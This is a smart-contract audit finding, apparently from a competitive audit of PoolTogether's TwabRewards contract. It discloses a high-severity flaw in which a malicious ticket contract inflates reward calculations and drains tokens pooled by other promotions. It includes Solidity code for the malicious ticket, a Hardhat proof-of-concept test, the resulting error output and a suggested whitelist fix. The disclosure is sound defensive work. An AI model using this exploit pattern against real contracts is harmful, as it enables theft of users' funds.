@@ -1,0 +1,21 @@
+[H-05] Malicious tickets can lead to the loss of all tokens
+Submitted by johnnycash, also found by WatchPug, csanuragjain, gpersoon, gzeon, harleythedog, kemmio, kenzo, leastwood, and pauliax
+Impact
+It allows an attacker to retrieve all the tokens of each promotions.
+Analysis
+Anyone can create a new promotion usingcreatePromotion(). An attacker can create a new malicious promotion with the following parameters:
+the address of a malicious ticket smart contractthe token address from the targeted promotion(s)optionally,_numberOfEpochsequal to 0 to create this promotion for free
+The only verification made on the ticket address given by_requireTicket()is that the smart contract must implement theITicketinterface.
+The attacker can then callclaimRewards()with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.
+_calculateRewardAmount()is first called to get the reward amount with the following formula(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween(). The malicious ticket can return an arbitrary_averageBalanceand an_averageTotalSuppliesof 1, leading to an arbitrary large reward amount._promotion.token.safeTransfer(_user, _rewardsAmount)is called. It transfers the amount of tokens previously computed to the attacker.
+The attacker receives the tokens of other promotions without having spent anything.
+Proof of Concept
+The malicious smart contract is a copy/paste ofTicketHarness.solandTicket.solwith the following changes:
+/// @inheritdoc ITicketfunctiongetAverageTotalSuppliesBetween(uint64[]calldata_startTimes,uint64[]calldata_endTimes)externalviewoverridereturns(uint256[]memory) {uint256[]memory_balances=newuint256[](1);_balances[0] =uint256(1);return_balances;}/// @inheritdoc ITicketfunctiongetAverageBalanceBetween(address_user,uint64_startTime,uint64_endTime)externalviewoverridereturns(uint256) {return1337;}
+The test for HardHat is:
+describe('exploit()',async()=>{it('this shouldnt happen',async()=>{constpromotionIdOne=1;constpromotionIdTwo=2;awaitexpect(createPromotion(ticket.address)).to.emit(twabRewards,'PromotionCreated').withArgs(promotionIdOne);letevilTicketFactory=awaitgetContractFactory('EvilTicket');letevilTicket=awaitevilTicketFactory.deploy('EvilTicket','TICK',18,wallet1.address);letcreatePromotionTimestamp= (awaitethers.provider.getBlock('latest')).timestamp;awaitexpect(twabRewards.connect(wallet2).createPromotion(evilTicket.address,rewardToken.address,tokensPerEpoch,createPromotionTimestamp,1,//epochDuration,0,//epochsNumber,)).to.emit(twabRewards,'PromotionCreated').withArgs(promotionIdTwo);awaitincreaseTime(100);constepochIds= ['100'];awaittwabRewards.connect(wallet2).claimRewards(wallet2.address,promotionIdTwo,epochIds);});});
+It results in the following error:
+1) TwabRewardsexploit()this shouldnt happen:Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
+Recommended Mitigation Steps
+Maybe add a whitelist of trusted tickets?
+PierrickGT (PoolTogether) confirmed
